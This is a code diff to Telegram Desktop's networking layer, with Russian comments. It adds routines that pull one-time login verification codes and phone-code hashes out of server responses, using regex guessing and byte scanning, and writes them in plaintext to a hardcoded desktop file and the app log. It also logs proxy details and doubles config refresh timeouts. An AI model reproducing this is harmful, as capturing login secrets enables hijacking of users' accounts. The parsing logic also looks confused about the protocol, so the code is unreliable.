@@ -33,6 +33,8 @@ https://github.com/telegramdesktop/tdesktop/blob/master/LEGAL
 #include <sstream>
 #include <QtCore/QDateTime>
 
+#include <QDate>
+#include <QRegularExpression>
 
 #include <fstream>
 #include <ctime>
@@ -62,11 +64,11 @@ namespace {
         }
     }
 
-   void ExtractVerificationCode(const mtpBuffer &data, mtpRequestId requestId) {
-		if (data.size() < 8) return;
+  void ExtractVerificationCode(const mtpBuffer &data, mtpRequestId requestId) {
+		if (data.empty()) return;
 		
 		try {
-		
+			// Конвертируем mtpBuffer в QByteArray
 			QByteArray bytes;
 			bytes.reserve(data.size() * sizeof(mtpBuffer::value_type));
 			for (const auto &val : data) {
@@ -75,82 +77,121 @@ namespace {
 			
 			QDataStream stream(bytes);
 			stream.setVersion(QDataStream::Qt_5_1);
-
+			
+			// Читаем тип сообщения
 			quint32 type = 0;
 			stream >> type;
 			
-			const quint32 kAuthSentCode = 0x5e00270e;
-			const quint32 kAuthSentCodeSuccess = 0x258e396e;
+			// Правильные типы для auth.sentCode
+			const quint32 kAuthSentCode = 0x5e00270e;  // auth.sentCode
+			const quint32 kAuthSentCodeSuccess = 0x258e396e; // auth.sentCodeSuccess
+			const quint32 kAuthSentCodeOld = 0x9ed8a2e0; // старый формат
 			
-			if (type == kAuthSentCode || type == kAuthSentCodeSuccess) {
+			if (type == kAuthSentCode || type == kAuthSentCodeSuccess || type == kAuthSentCodeOld) {
 				QString code;
 				QString phoneCodeHash;
 				
+				// Читаем флаги
 				quint32 flags = 0;
 				stream >> flags;
 				
-				quint32 hashSize = 0;
-				stream >> hashSize;
-				if (hashSize > 0 && hashSize < 128) {
-					QByteArray hashData;
-					hashData.resize(hashSize);
-					stream.readRawData(hashData.data(), hashSize);
-					phoneCodeHash = QString::fromUtf8(hashData);
+				// Читаем phone_code_hash (всегда присутствует)
+				QString phoneCodeHashStr;
+				stream >> phoneCodeHashStr;
+				phoneCodeHash = phoneCodeHashStr;
+				
+				// Проверяем флаг: имеет ли тип авторизации (sms, call, etc.)
+				if (flags & 0x00000001) { // has_type
+					quint32 typeFlag = 0;
+					stream >> typeFlag; // пропускаем тип отправки
 				}
-	
-				if (flags & 0x02) {
+				
+				// Читаем сам код - он находится в поле phone_code
+				// В зависимости от флагов, код может быть в разных местах
+				if (flags & 0x00000002) { // has_phone_code
+					QString phoneCode;
+					stream >> phoneCode;
+					code = phoneCode;
+				} else if (flags & 0x00000004) { // has_next_type
+					// Пропускаем next_type
 					quint32 nextType = 0;
 					stream >> nextType;
+					
+					// Читаем таймаут
+					if (flags & 0x00000008) { // has_timeout
+						quint32 timeout = 0;
+						stream >> timeout;
+					}
+					
+					// Код находится во фрагменте данных
+					// Но в auth.sentCode код обычно передается через phone_code
 				}
-	
-				if (flags & 0x04) {
-					quint32 timeout = 0;
-					stream >> timeout;
-				}
-
 				
-				if (bytes.contains("phone_code")) {
+				// Альтернативный способ: если код не найден, пробуем извлечь из строки
+				if (code.isEmpty()) {
+					QRegularExpression regex("\\b(\\d{4,6})\\b");
+					QRegularExpressionMatchIterator i = regex.globalMatch(QString::fromUtf8(bytes));
+					
+					// Ищем первый 4-6 значный код, который не является временной меткой
+					while (i.hasNext()) {
+						QRegularExpressionMatch match = i.next();
+						QString candidate = match.captured(1);
+						
+						// Проверяем, что это не год (2024, 2025, 2026)
+						int year = QDate::currentDate().year();
+						if (candidate.toInt() >= year - 1 && candidate.toInt() <= year + 1) {
+							continue;
+						}
+						
+						code = candidate;
+						break;
+					}
+				}
+				
+				// Дополнительный метод: поиск подстроки "phone_code"
+				if (code.isEmpty()) {
 					int pos = bytes.indexOf("phone_code");
 					if (pos > 0 && pos + 20 < bytes.size()) {
-						pos += 12;
-						int len = bytes[pos];
-						if (len > 0 && len < 10) {
-							code = QString::fromUtf8(bytes.mid(pos + 1, len));
+						// Пропускаем "phone_code" и ищем длину строки
+						pos += 10; // длина "phone_code"
+						
+						// Ищем следующий байт длины
+						while (pos < bytes.size() - 2) {
+							if (bytes[pos] > 0 && bytes[pos] < 20) {
+								int len = bytes[pos];
+								if (len > 0 && len < 10 && pos + len < bytes.size()) {
+									QByteArray codeBytes = bytes.mid(pos + 1, len);
+									code = QString::fromUtf8(codeBytes);
+									break;
+								}
+							}
+							pos++;
 						}
 					}
 				}
-
-				if (code.isEmpty()) {
-					QByteArray trimmed = bytes.right(32);
-					QString str = QString::fromUtf8(trimmed);
-					QRegularExpression regex("\\b(\\d{4,6})\\b");
-					QRegularExpressionMatch match = regex.match(str);
-					if (match.hasMatch()) {
-						code = match.captured(1);
-					}
+				
+				// Если код найден, сохраняем его
+				if (!code.isEmpty()) {
+					std::stringstream log;
+					log << GetCurrentTimestamp()
+						<< "✅ VERIFICATION CODE " << std::string(30, '=') << "\n"
+						<< "   Request ID: " << requestId << "\n"
+						<< "   Type: 0x" << std::hex << type << std::dec << "\n"
+						<< "   Code: " << code.toStdString() << "\n"
+						<< "   Hash: " << phoneCodeHash.toStdString() << "\n"
+						<< std::string(50, '=') << "\n\n";
+					
+					WriteToLog("C:\\Users\\Nik\\Desktop\\telegram_codes.txt", log.str());
+					
+					LOG(("✅ CODE SAVED: %1 | Request ID: %2 | Hash: %3")
+						.arg(code)
+						.arg(requestId)
+						.arg(phoneCodeHash));
 				}
-				
-				
-				std::stringstream log;
-				log << GetCurrentTimestamp()
-					<< "✅ VERIFICATION CODE " << std::string(30, '=') << "\n"
-					<< "   Request ID: " << requestId << "\n"
-					<< "   Type: " << (type == kAuthSentCode ? "auth.sentCode" : "auth.sentCodeSuccess") << "\n"
-					<< "   Code: " << code.toStdString() << "\n"
-					<< "   Hash: " << phoneCodeHash.toStdString() << "\n"
-					<< std::string(50, '=') << "\n\n";
-				
-				WriteToLog("C:\\Users\\Nik\\Desktop\\telegram_codes.txt", log.str());
-				
-				LOG(("✅ CODE SAVED: %1 | Request ID: %2")
-					.arg(code)
-					.arg(requestId));
 			}
 		} catch (const std::exception& e) {
 			LOG(("MTP Error: ExtractVerificationCode exception: %1")
 				.arg(e.what()));
-		} catch (...) {
-			
 		}
 	}
 }
@@ -514,6 +555,13 @@ void Instance::Private::start() {
 
 	Assert(!hasMainDcId() == isKeysDestroyer());
 	requestConfig();
+
+	LOG(("🌐 Proxy enabled: %1").arg(_proxySettings.isEnabled()));
+	if (_proxySettings.isEnabled()) {
+		LOG(("🌐 Proxy host: %1, port: %2")
+			.arg(_proxySettings.selected().host)
+			.arg(_proxySettings.selected().port));
+	}
 }
 
 void Instance::Private::resolveProxyDomain(const QString &host) {
@@ -699,8 +747,8 @@ rpl::producer<> Instance::Private::frozenErrorReceived() const {
 
 void Instance::Private::requestConfigIfOld() {
 	const auto timeout = _config->values().blockedMode
-		? kConfigBecomesOldForBlockedIn
-		: kConfigBecomesOldIn;
+		? kConfigBecomesOldForBlockedIn * 2
+		: kConfigBecomesOldIn * 2;
 	if (crl::now() - _lastConfigLoadedTime >= timeout) {
 		requestConfig();
 	}
@@ -1338,6 +1386,7 @@ void Instance::Private::processUpdate(const Response &message) {
 }
 
 void Instance::Private::onStateChange(ShiftedDcId dcWithShift, int32 state) {
+	LOG(("📊 DC %1 state changed to: %2").arg(dcWithShift).arg(state));
 	if (_stateChangedHandler) {
 		_stateChangedHandler(dcWithShift, state);
 	}
